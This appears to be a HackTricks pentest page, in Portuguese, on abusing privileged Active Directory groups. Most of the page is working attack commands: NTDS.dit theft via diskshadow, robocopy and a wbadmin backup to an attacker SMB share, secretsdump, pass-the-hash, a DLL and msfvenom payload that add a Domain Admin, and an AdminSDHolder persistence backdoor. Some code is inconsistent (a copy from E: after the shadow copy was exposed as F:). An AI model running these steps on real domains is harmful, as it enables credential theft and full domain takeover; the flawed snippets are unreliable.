# Grupos privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos conhecidos com privilégios de administração

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo tem permissão para criar contas e grupos que não são administradores no domínio. Além disso, ele permite o login local no Domain Controller (DC).

Para identificar os membros deste grupo, o seguinte comando é executado:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
É permitido adicionar novos usuários, assim como fazer login local no DC.<sup>[[1]](#references)</sup>

## Grupo AdminSDHolder

A **Access Control List (ACL)** do grupo **AdminSDHolder** é crucial, pois define as permissões para todos os "grupos protegidos" no Active Directory, incluindo grupos com altos privilégios. Esse mecanismo garante a segurança desses grupos ao impedir modificações não autorizadas.

Um atacante poderia explorar isso modificando a **ACL** do grupo **AdminSDHolder** e concedendo permissões completas a um usuário padrão. Isso daria efetivamente a esse usuário controle total sobre todos os grupos protegidos. Se as permissões desse usuário fossem alteradas ou removidas, elas seriam automaticamente restauradas dentro de uma hora devido ao funcionamento do sistema.<sup>[[14]](#references)</sup>

A documentação recente do Windows Server ainda trata vários grupos de operadores integrados como objetos **protegidos** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). O processo **SDProp** é executado no **PDC Emulator** a cada 60 minutos por padrão, define `adminCount=1` e desativa a herança em objetos protegidos. Isso é útil tanto para persistência quanto para procurar usuários privilegiados obsoletos que foram removidos de um grupo protegido, mas ainda mantêm a ACL sem herança.<sup>[[12]](#references)</sup>

Os comandos para revisar os membros e modificar as permissões incluem:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Um script está disponível para acelerar o processo de restauração: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para mais detalhes, visite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

A associação a este grupo permite a leitura de objetos excluídos do Active Directory, o que pode revelar informações confidenciais:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Isso é útil para **recuperar caminhos de privilégios anteriores**. Objetos excluídos ainda podem expor `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs antigos ou o DN de um grupo privilegiado excluído que posteriormente pode ser restaurado por outro operador.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Acesso ao Controlador de Domínio

O acesso aos arquivos no DC é restrito, a menos que o usuário faça parte do grupo `Server Operators`, o que altera o nível de acesso.

### Escalonamento de Privilégios

Usando `PsService` ou `sc` do Sysinternals, é possível inspecionar e modificar as permissões dos serviços. O grupo `Server Operators`, por exemplo, tem controle total sobre determinados serviços, permitindo a execução de comandos arbitrários e o escalonamento de privilégios:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` têm acesso total, permitindo a manipulação de serviços para obter privilégios elevados.

## Backup Operators

A associação ao grupo `Backup Operators` fornece acesso ao sistema de arquivos do `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem percorrer pastas, listar e copiar arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para esse processo.<sup>[[1]](#references)</sup>

Para listar os membros do grupo, execute:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque Local

Para explorar esses privilégios localmente, as seguintes etapas são empregadas:

1. Importe as bibliotecas necessárias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Habilite e verifique `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acessar e copiar arquivos de diretórios restritos, por exemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

O acesso direto ao sistema de arquivos do Domain Controller permite o roubo do banco de dados `NTDS.dit`, que contém todos os hashes NTLM dos usuários e computadores do domínio.

#### Usando diskshadow.exe

1. Crie uma cópia de sombra da unidade `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copie o `NTDS.dit` da Shadow Copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Como alternativa, use `robocopy` para copiar arquivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraia `SYSTEM` e `SAM` para obtenção de hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recupere todos os hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Pós-extração: Pass-the-Hash para DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Usando wbadmin.exe

1. Configure o filesystem NTFS para o servidor SMB na máquina do atacante e armazene em cache as credenciais SMB na máquina-alvo.
2. Use `wbadmin.exe` para realizar o backup do sistema e a extração do `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para uma demonstração prática, consulte [VÍDEO DE DEMONSTRAÇÃO COM IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Membros do grupo **DnsAdmins** podem explorar seus privilégios para carregar uma DLL arbitrária com privilégios de SYSTEM em um servidor DNS, geralmente hospedado em Controladores de Domínio. Essa capacidade permite um potencial significativo de exploração.

Para listar os membros do grupo DnsAdmins, use:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Executar uma DLL arbitrária (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidade permite a execução de código arbitrário com privilégios de SYSTEM no serviço DNS (geralmente dentro dos DCs). Esse problema foi corrigido em 2021.

Os membros podem fazer o servidor DNS carregar uma DLL arbitrária (localmente ou de um compartilhamento remoto) usando comandos como:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar o serviço DNS (o que pode exigir permissões adicionais) é necessário para que a DLL seja carregada:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para mais detalhes sobre este vetor de ataque, consulte ired.team.

#### Mimilib.dll

Também é possível usar mimilib.dll para command execution, modificando-o para executar comandos específicos ou reverse shells. [Confira este post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para obter mais informações.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins pode manipular registros DNS para realizar ataques Man-in-the-Middle (MitM), criando um registro WPAD após desabilitar a global query block list. Ferramentas como Responder ou Inveigh podem ser usadas para spoofing e captura de tráfego de rede.

### Event Log Readers
Os membros podem acessar logs de eventos, encontrando potencialmente informações confidenciais, como senhas em texto simples ou detalhes de command execution:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Este grupo pode modificar DACLs no objeto de domínio, potencialmente concedendo privilégios de DCSync. As técnicas de privilege escalation que exploram este grupo estão detalhadas no repositório GitHub Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Se você puder agir como membro desse grupo, o abuso clássico consiste em conceder a um principal controlado pelo atacante os direitos de replicação necessários para [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historicamente, **PrivExchange** encadeava acesso a caixas de correio, autenticação coercitiva do Exchange e LDAP relay para obter acesso a essa mesma primitiva. Mesmo quando esse caminho de relay é mitigado, a associação direta a `Exchange Windows Permissions` ou o controle de um servidor Exchange continua sendo uma rota de alto valor para obter direitos de replicação do domínio.

## Hyper-V Administrators

Hyper-V Administrators têm acesso total ao Hyper-V, o que pode ser explorado para obter controle sobre Domain Controllers virtualizados. Isso inclui clonar DCs ativos e extrair hashes NTLM do arquivo NTDS.dit.

### Exploitation Example

O abuso prático geralmente consiste no **acesso offline a discos/checkpoints de DCs**, e não em técnicas antigas de LPE no nível do host. Com acesso ao host Hyper-V, um operador pode criar um checkpoint ou exportar um Domain Controller virtualizado, montar o VHDX e extrair `NTDS.dit`, `SYSTEM` e outros secrets sem interagir com o LSASS dentro do guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
A partir daí, reutilize o workflow de `Backup Operators` para copiar `Windows\NTDS\ntds.dit` e os registry hives offline.

## Group Policy Creators Owners

Este grupo permite que os membros criem Group Policies no domínio. No entanto, seus membros não podem aplicar Group Policies a usuários ou grupos nem editar GPOs existentes.

A nuance importante é que o **criador se torna o proprietário da nova GPO** e geralmente obtém direitos suficientes para editá-la posteriormente. Isso significa que este grupo é interessante quando você pode:

- criar uma GPO maliciosa e convencer um administrador a vinculá-la a uma OU/domínio alvo
- editar uma GPO que você criou e que já está vinculada em algum lugar útil
- abusar de outro direito delegado que permita vincular GPOs, enquanto este grupo fornece a capacidade de edição

Na prática, o abuso normalmente envolve adicionar uma **Immediate Task**, um **startup script**, uma alteração de **local admin membership** ou de **user rights assignment** por meio de arquivos de policy armazenados no SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Se editar a GPO manualmente por meio do `SYSVOL`, lembre-se de que a alteração, por si só, não é suficiente: `versionNumber`, `GPT.ini` e, às vezes, `gPCMachineExtensionNames` também devem ser atualizados, caso contrário, os clientes ignorarão a atualização da policy.<sup>[[9]](#references)</sup>

## Organization Management

Em ambientes nos quais o **Microsoft Exchange** está implantado, um grupo especial conhecido como **Organization Management** possui recursos significativos. Esse grupo tem privilégios para **acessar as caixas de correio de todos os usuários do domínio** e mantém **controle total sobre** a Unidade Organizacional (OU) **'Microsoft Exchange Security Groups'**. Esse controle inclui o grupo **`Exchange Windows Permissions`**, que pode ser explorado para escalation de privilégios.

### Exploração de Privilégios e Comandos

#### Print Operators

Os membros do grupo **Print Operators** recebem vários privilégios, incluindo o **`SeLoadDriverPrivilege`**, que permite **fazer logon localmente em um Domain Controller**, desligá-lo e gerenciar impressoras. Para explorar esses privilégios, especialmente se **`SeLoadDriverPrivilege`** não estiver visível em um contexto sem elevação, é necessário contornar o User Account Control (UAC).<sup>[[1]](#references)</sup>

Para listar os membros desse grupo, o seguinte comando do PowerShell é usado:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Nos Controladores de Domínio, esse grupo é perigoso porque a Política padrão do Controlador de Domínio concede o privilégio **`SeLoadDriverPrivilege`** a `Print Operators`. Se você obtiver um token elevado para um membro desse grupo, poderá habilitar o privilégio e carregar um driver assinado, mas vulnerável, para alcançar o kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Para obter detalhes sobre o gerenciamento de tokens, consulte [Tokens de Acesso](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Os membros desse grupo recebem acesso aos PCs por meio do Remote Desktop Protocol (RDP). Para enumerar esses membros, há comandos do PowerShell disponíveis:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Mais informações sobre a exploração de RDP podem ser encontradas em recursos dedicados de pentesting.

#### Remote Management Users

Os membros podem acessar PCs por meio do **Windows Remote Management (WinRM)**. A enumeração desses membros é realizada por meio de:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de exploração relacionadas ao **WinRM**, consulte a documentação específica.

#### Server Operators

Este grupo tem permissões para executar várias configurações em Controladores de Domínio, incluindo privilégios de backup e restauração, alteração da hora do sistema e desligamento do sistema.<sup>[[1]](#references)</sup> Para enumerar os membros, use o comando:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Em Domain Controllers, `Server Operators` geralmente herdam direitos suficientes para **reconfigurar ou iniciar/parar serviços** e também recebem `SeBackupPrivilege`/`SeRestorePrivilege` por meio da política padrão de DC. Na prática, isso os torna uma ponte entre **service-control abuse** e **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Se uma ACL de serviço conceder a este grupo direitos de alteração/inicialização, aponte o serviço para um comando arbitrário, inicie-o como `LocalSystem` e, em seguida, restaure o `binPath` original. Se o controle de serviços estiver bloqueado, recorra às técnicas de `Backup Operators` acima para copiar o `NTDS.dit`.

## Referências

- [1] [ired.team – Contas privilegiadas e privilégios de token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Um guia de Red Teamer para GPOs e OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – Função NtLoadDriver](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — LDAP anônimo → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Apêndice C: Contas e grupos protegidos no Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Como abusar e criar um backdoor no AdminSDHolder para obter persistência de Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
